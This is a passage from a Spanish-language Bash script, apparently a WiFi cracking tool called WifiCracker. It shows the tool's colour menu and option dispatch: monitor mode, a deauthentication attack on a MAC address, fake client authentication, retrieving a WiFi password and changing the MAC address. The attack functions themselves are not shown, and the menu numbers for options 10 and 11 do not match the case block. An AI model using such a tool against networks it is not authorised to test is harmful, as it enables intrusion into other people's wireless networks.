      echo -e "$blueColour 10$endColour.$yellowColour Instalar programas necesarios$endColour  $blueColour ||$endColour                                     $greenColour*$endColour "
      echo -e "                                                                            $greenColour*$endColour "
      echo -e "$greenColour*****************************************************************************$endColour"
      echo -e "$purpleColour---------------------------------------------------$endColour"
      echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
      echo -e "$purpleColour---------------------------------------------------$endColour"
      echo -e "$redColour 0. Salir$endColour $blueColour||$endColour $grayColour? - Mostrar IP pública$endColour $purpleColour|$endColour"
      echo -e "$purpleColour-------------------------------------$endColour"
      sleep 0.5

      echo " "
      entrada=5
    fi

    if [ "$entrada" = "5" ]; then
      clear
      echo " "
      echo -e "$greenColour*****************************************************************************$endColour"
      echo -e "$redColour                        ╔╗╔╗╔╗─╔═╗╔═══╗───────╔╗$endColour                            $greenColour*$endColour"
      echo -e "$redColour                        ║║║║║║─║╔╝║╔═╗║───────║║$endColour                            $greenColour*$endColour"
      echo -e "$redColour                        ║║║║║╠╦╝╚╦╣║─╚╬═╦══╦══╣║╔╦══╦═╗$endColour                     $greenColour*$endColour"
      echo -e "$redColour                        ║╚╝╚╝╠╬╗╔╬╣║─╔╣╔╣╔╗║╔═╣╚╝╣║═╣╔╝$endColour  $blueColour(V0.1.4)$endColour           $greenColour*$endColour"
      echo -e "$redColour                        ╚╗╔╗╔╣║║║║║╚═╝║║║╔╗║╚═╣╔╗╣║═╣║ $endColour                     $greenColour*$endColour"
      echo -e "$redColour                        ─╚╝╚╝╚╝╚╝╚╩═══╩╝╚╝╚╩══╩╝╚╩══╩╝ $endColour                     $greenColour*$endColour"
      echo -e "$greenColour*****************************************************************************$endColour"
      echo -e "                                                                            $greenColour*$endColour "
      echo -e "$blueColour  1$endColour.$yellowColour Iniciar el modo monitor$endColour         $blueColour||$endColour $blueColour 11$endColour.$yellowColour Reiniciar programa           $endColour  $greenColour*$endColour"
      echo -e "$blueColour  2$endColour.$yellowColour Mostrar interfaces$endColour              $blueColour||$endColour                                     $greenColour*$endColour"
      echo -e "$blueColour  3$endColour.$yellowColour Dar de baja el modo monitor$endColour     $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  4$endColour.$yellowColour Escanear redes wifis$endColour            $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  5$endColour.$yellowColour Deautenticación a dirección MAC$endColour $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  6$endColour.$yellowColour Falsa autenticación de cliente$endColour  $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  7$endColour.$yellowColour Obtener contraseña Wifi$endColour         $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  8$endColour.$yellowColour Mostrar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour  9$endColour.$yellowColour Cambiar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
      echo -e "$blueColour 10$endColour.$yellowColour Instalar programas necesarios$endColour  $blueColour ||$endColour                                     $greenColour*$endColour "
      echo -e "                                                                            $greenColour*$endColour "
      echo -e "$greenColour*****************************************************************************$endColour"
      echo -e "$purpleColour---------------------------------------------------$endColour"
      echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
      echo -e "$purpleColour---------------------------------------------------$endColour"
      echo -e "$redColour 0. Salir$endColour $blueColour||$endColour $grayColour? - Mostrar IP pública$endColour $purpleColour|$endColour"
      echo -e "$purpleColour-------------------------------------$endColour"
      echo " "
    fi

    echo -n -e "$yellowColour Introduzca una opcion -> $endColour"
    read opcionMenu

    case $opcionMenu in

      1 ) monitorMode ;;

      2 ) interfacesMode ;;

      3 ) monitorDown ;;

      4 ) wifiScanner ;;

      5 ) macAttack ;;

      6 ) fakeAuth ;;

      7 ) wifiPassword ;;

      8 ) showMAC ;;

      9 ) changeMAC ;;

      10 ) resetProgram ;;

      11 ) necessaryPrograms ;;

      -h | --help ) panelHelp ;;

      -a | --author ) autorInfo ;;

      -v | --version ) versionSystem ;;

      -h1 ) monitorHelp ;;

      -h2 ) interfacesHelp ;;

      -h3 ) monitorDownHelp ;;

      0 ) echo " "
      exit
      ;;

      ? ) showIP ;;


      * ) echo " "
          echo -e "$redColour Esta opción no existe, vuelva a intentarlo$endColour"
          echo " "
          sleep 2
          ;;
    esac
done
